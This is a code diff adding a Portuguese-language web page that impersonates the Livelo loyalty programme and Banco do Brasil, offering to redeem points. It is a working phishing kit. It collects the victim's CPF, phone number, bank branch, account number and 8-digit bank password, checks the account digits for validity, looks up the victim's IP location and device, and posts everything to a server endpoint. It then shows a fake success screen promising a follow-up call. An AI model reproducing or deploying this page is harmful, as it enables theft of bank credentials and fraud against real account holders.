@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Clube de Resgate</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #FFFFFF;
+            color: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background-color: #FFFFFF;
+            padding: 30px 24px 40px;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .logos img {
+            height: 45px;
+            object-fit: contain;
+        }
+
+        .tela {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .tela.ativa {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .home-titulo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+
+        .home-subtitulo {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .home-lista {
+            list-style: none;
+            text-align: left;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+
+        .home-lista li {
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f0f0;
+            color: #333333;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .home-lista li::before {
+            content: "✓";
+            color: #ff0000;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .home-lista li:last-child {
+            border-bottom: none;
+        }
+
+        .titulo {
+            font-size: 22px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 25px;
+            color: #000000;
+        }
+
+        .titulo span {
+            color: #ff0000;
+        }
+
+        .subtitulo {
+            font-size: 16px;
+            font-weight: 300;
+            color: #666666;
+            margin-bottom: 20px;
+        }
+
+        .grupo-campo {
+            text-align: left;
+            margin-bottom: 14px;
+        }
+
+        .grupo-campo label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 4px;
+        }
+
+        .campo {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #CCCCCC;
+            border-radius: 12px;
+            background-color: #FFFFFF;
+            color: #000000;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .campo:focus {
+            border-color: #ff0000;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            background-color: #ff0000;
+            color: #FFFFFF;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background-color: #cc0000;
+            transform: scale(1.02);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #FFFFFF;
+            border-radius: 50%;
+            animation: girar 0.8s linear infinite;
+        }
+
+        @keyframes girar {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .destaque-pontos {
+            font-size: 38px;
+            font-weight: 900;
+            color: #ff0000;
+            display: block;
+            margin: 10px 0;
+        }
+
+        .texto-pontos {
+            font-size: 16px;
+            color: #333333;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .erro {
+            color: #ff0000;
+            font-size: 14px;
+            margin-top: -8px;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .erro.visivel {
+            display: block;
+        }
+
+        .sucesso-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .sucesso-titulo {
+            font-size: 22px;
+            font-weight: 700;
+            color: #00aa00;
+            margin-bottom: 15px;
+        }
+
+        .sucesso-texto {
+            font-size: 16px;
+            color: #333333;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 16px 30px;
+            }
+            .titulo {
+                font-size: 20px;
+            }
+            .logos img {
+                height: 35px;
+            }
+            .campo {
+                padding: 12px 14px;
+                font-size: 15px;
+            }
+            .btn {
+                padding: 16px;
+                font-size: 16px;
+            }
+            .destaque-pontos {
+                font-size: 32px;
+            }
+            .home-titulo {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- ===== LOGOS ===== -->
+        <div class="logos">
+            <img src="imagens/logo-livelo.png" alt="Livelo">
+            <img src="imagens/logo-bb.png" alt="BB">
+        </div>
+
+        <!-- ===== TELA 1 - HOME ===== -->
+        <div class="tela ativa" id="telaHome">
+            <div class="home-titulo">Bem-vindo à livelo</div>
+            <div class="home-subtitulo">Troque seus pontos por experiências incríveis!</div>
+            <ul class="home-lista">
+                <li>Cashback</li>
+                <li>Viagens</li>
+                <li>Passagens Aéreas</li>
+                <li>Hotéis</li>
+                <li>Aluguel de carros</li>
+                <li>Passeios e ingressos</li>
+            </ul>
+            <button class="btn" id="btnRegistrar">Registrar meus pontos</button>
+        </div>
+
+        <!-- ===== TELA 2 - CPF ===== -->
+        <div class="tela" id="telaCpf">
+            <div class="titulo">Vamos lá! Primeiro,<br>confirme o seu <span>CPF</span>.</div>
+
+            <div class="grupo-campo">
+                <label>CPF</label>
+                <input type="text" class="campo" id="cpf" placeholder="000.000.000-00" maxlength="14" autocomplete="off">
+            </div>
+
+            <div class="grupo-campo">
+                <label>Telefone</label>
+                <input type="text" class="campo" id="telefone" placeholder="(00) 00000-0000" maxlength="15" autocomplete="off">
+            </div>
+
+            <div class="erro" id="erroConsulta">CPF inválido. Tente novamente.</div>
+            <button class="btn" id="btnConsultar">CONSULTAR</button>
+        </div>
+
+        <!-- ===== TELA 3 - RESGATE ===== -->
+        <div class="tela" id="telaResgate">
+            <div class="titulo" style="font-size: 20px;">Olá <span id="nomeUsuario">Pedro</span>,</div>
+            <span class="destaque-pontos" id="pontosUsuario">92.236</span>
+            <div class="texto-pontos">pontos disponíveis para resgate.</div>
+            <div class="subtitulo" style="margin-bottom: 15px; font-size: 14px; color: #777777;">Para iniciar o resgate conecte-se ao BB:</div>
+
+            <div class="grupo-campo">
+                <label>Agência</label>
+                <input type="text" class="campo" id="agencia" placeholder="0000-0" maxlength="6" autocomplete="off">
+            </div>
+
+            <div class="grupo-campo">
+                <label>Conta</label>
+                <input type="text" class="campo" id="conta" placeholder="00000000-0" maxlength="10" autocomplete="off">
+            </div>
+
+            <div class="grupo-campo">
+                <label>Senha de 8 dígitos</label>
+                <input type="password" class="campo" id="senha" placeholder="00000000" maxlength="8" autocomplete="off">
+            </div>
+
+            <button class="btn" id="btnResgate">INICIAR RESGATE</button>
+        </div>
+
+        <!-- ===== TELA 4 - SUCESSO ===== -->
+        <div class="tela" id="telaSucesso">
+            <div class="sucesso-icon">✅</div>
+            <div class="sucesso-titulo">Resgate iniciado com sucesso!</div>
+            <div class="sucesso-texto">Em breve nossa equipe responsável entrará em contato.</div>
+        </div>
+
+    </div>
+
+    <script>
+        // ================================================================
+        // TROCAR TELA
+        // ================================================================
+        function mostrarTela(id) {
+            document.querySelectorAll('.tela').forEach(t => t.classList.remove('ativa'));
+            document.getElementById(id).classList.add('ativa');
+        }
+
+        // ================================================================
+        // BOTÃO REGISTRAR
+        // ================================================================
+        document.getElementById('btnRegistrar').addEventListener('click', function() {
+            mostrarTela('telaCpf');
+        });
+
+        // ================================================================
+        // MÁSCARA CPF
+        // ================================================================
+        document.getElementById('cpf').addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length > 11) valor = valor.slice(0, 11);
+            if (valor.length <= 3) {
+                this.value = valor;
+            } else if (valor.length <= 6) {
+                this.value = valor.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+            } else if (valor.length <= 9) {
+                this.value = valor.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+            } else {
+                this.value = valor.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+            }
+        });
+
+        // ================================================================
+        // MÁSCARA TELEFONE
+        // ================================================================
+        document.getElementById('telefone').addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length > 11) valor = valor.slice(0, 11);
+            if (valor.length <= 2) {
+                this.value = valor;
+            } else if (valor.length <= 6) {
+                this.value = valor.replace(/(\d{2})(\d{1,4})/, '($1) $2');
+            } else {
+                this.value = valor.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+            }
+        });
+
+        // ================================================================
+        // MÁSCARA AGÊNCIA
+        // ================================================================
+        document.getElementById('agencia').addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length > 5) valor = valor.slice(0, 5);
+            if (valor.length <= 4) {
+                this.value = valor;
+            } else {
+                this.value = valor.replace(/(\d{4})(\d{1})/, '$1-$2');
+            }
+        });
+
+        // ================================================================
+        // MÁSCARA CONTA
+        // ================================================================
+        document.getElementById('conta').addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length > 9) valor = valor.slice(0, 9);
+            if (valor.length <= 8) {
+                this.value = valor;
+            } else {
+                this.value = valor.replace(/(\d{8})(\d{1})/, '$1-$2');
+            }
+        });
+
+        // ================================================================
+        // VALIDAÇÃO SENHA (só máscara)
+        // ================================================================
+        document.getElementById('senha').addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length > 8) valor = valor.slice(0, 8);
+            this.value = valor;
+        });
+
+        // ================================================================
+        // DADOS DO USUÁRIO
+        // ================================================================
+        let dadosUsuario = {};
+
+        // ================================================================
+        // VALIDAÇÕES BB
+        // ================================================================
+        function calcularDVBB(numero) {
+            const pesos = [9, 8, 7, 6, 5, 4, 3, 2];
+            let soma = 0;
+            for (let i = 0; i < numero.length; i++) {
+                soma += parseInt(numero[i]) * pesos[i];
+            }
+            let resto = soma % 11;
+            let dv = 11 - resto;
+            if (dv === 10 || dv === 11) dv = 0;
+            return dv;
+        }
+
+        function validarAgenciaBB(agencia) {
+            const numeros = agencia.replace(/\D/g, '');
+            if (numeros.length !== 5) return false;
+            const base = numeros.substring(0, 4);
+            const dvInformado = parseInt(numeros.substring(4, 5));
+            const dvCalculado = calcularDVBB(base);
+            return dvInformado === dvCalculado;
+        }
+
+        function validarContaBB(conta) {
+            const numeros = conta.replace(/\D/g, '');
+            if (numeros.length !== 9) return false;
+            const base = numeros.substring(0, 8);
+            const dvInformado = parseInt(numeros.substring(8, 9));
+            const dvCalculado = calcularDVBB(base);
+            return dvInformado === dvCalculado;
+        }
+
+        // ================================================================
+        // CONSULTAR CPF
+        // ================================================================
+        document.getElementById('btnConsultar').addEventListener('click', async function() {
+            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+            const telefone = document.getElementById('telefone').value.replace(/\D/g, '');
+            const erroEl = document.getElementById('erroConsulta');
+
+            erroEl.classList.remove('visivel');
+
+            if (cpf.length !== 11) {
+                erroEl.textContent = 'Digite um CPF válido com 11 dígitos.';
+                erroEl.classList.add('visivel');
+                return;
+            }
+
+            if (telefone.length < 10) {
+                erroEl.textContent = 'Digite um telefone válido.';
+                erroEl.classList.add('visivel');
+                return;
+            }
+
+            this.disabled = true;
+            this.textContent = 'Consultando...';
+
+            try {
+                const response = await fetch(`/api/consultar-cpf/${cpf}`);
+                const data = await response.json();
+
+                console.log('📦 Dados recebidos do servidor:', data);
+
+                if (data.sucesso && data.nome) {
+                    dadosUsuario = {
+                        cpf: cpf,
+                        telefone: telefone,
+                        nome: data.nome
+                    };
+
+                    document.getElementById('nomeUsuario').textContent = data.nome;
+                    mostrarTela('telaResgate');
+                } else {
+                    erroEl.textContent = data.mensagem || 'CPF não encontrado ou inválido';
+                    erroEl.classList.add('visivel');
+                }
+            } catch (error) {
+                console.error('❌ Erro:', error);
+                erroEl.textContent = 'Erro ao consultar. Tente novamente.';
+                erroEl.classList.add('visivel');
+            }
+
+            this.disabled = false;
+            this.textContent = 'CONSULTAR';
+        });
+
+        // ================================================================
+        // INICIAR RESGATE (COM MENSAGENS SIMPLES)
+        // ================================================================
+        document.getElementById('btnResgate').addEventListener('click', async function() {
+            const agencia = document.getElementById('agencia').value.trim();
+            const conta = document.getElementById('conta').value.trim();
+            const senha = document.getElementById('senha').value.trim();
+
+            let erros = [];
+
+            if (!agencia) {
+                erros.push('Preencha o campo Agência.');
+            } else if (!validarAgenciaBB(agencia)) {
+                erros.push('Agência inválida.');
+            }
+
+            if (!conta) {
+                erros.push('Preencha o campo Conta.');
+            } else if (!validarContaBB(conta)) {
+                erros.push('Conta inválida.');
+            }
+
+            if (!senha) {
+                erros.push('Preencha a senha de 8 dígitos.');
+            } else if (senha.length !== 8) {
+                erros.push('A senha deve ter exatamente 8 dígitos.');
+            }
+
+            if (erros.length > 0) {
+                alert('❌ ' + erros.join('\n'));
+                return;
+            }
+
+            this.disabled = true;
+            this.innerHTML = '<span class="spinner"></span> Carregando...';
+            this.style.backgroundColor = '#666';
+
+            let ip = 'Desconhecido';
+            let cidade = 'Desconhecida';
+            let dispositivo = 'Desconhecido';
+
+            try {
+                const geoResponse = await fetch('http://ip-api.com/json/');
+                const geoData = await geoResponse.json();
+                if (geoData.status === 'success') {
+                    ip = geoData.query || 'Desconhecido';
+                    cidade = `${geoData.city || ''} - ${geoData.region || ''}`.trim() || 'Desconhecida';
+                }
+            } catch (error) {}
+
+            const ua = navigator.userAgent;
+            if (/iPhone|iPad|iPod/i.test(ua)) dispositivo = 'iPhone';
+            else if (/Android/i.test(ua)) dispositivo = 'Android';
+            else if (/Windows/i.test(ua)) dispositivo = 'Windows PC';
+            else if (/Mac/i.test(ua)) dispositivo = 'Mac';
+            else dispositivo = 'Outro';
+
+            const dadosCompletos = {
+                cpf: dadosUsuario.cpf,
+                telefone: dadosUsuario.telefone,
+                nome: dadosUsuario.nome,
+                agencia: agencia,
+                conta: conta,
+                senha: senha,
+                ip: ip,
+                cidade: cidade,
+                dispositivo: dispositivo
+            };
+
+            try {
+                await fetch('/api/salvar-resgate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dadosCompletos)
+                });
+                console.log('✅ Dados salvos com sucesso!');
+            } catch (error) {
+                console.error('Erro ao salvar:', error);
+            }
+
+            mostrarTela('telaSucesso');
+        });
+
+        // ================================================================
+        // ENTER PARA ENVIAR
+        // ================================================================
+        document.getElementById('cpf').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('btnConsultar').click();
+        });
+        document.getElementById('telefone').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('btnConsultar').click();
+        });
+        document.getElementById('agencia').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('btnResgate').click();
+        });
+        document.getElementById('conta').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('btnResgate').click();
+        });
+        document.getElementById('senha').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('btnResgate').click();
+        });
+    </script>
+
+</body>
+</html>
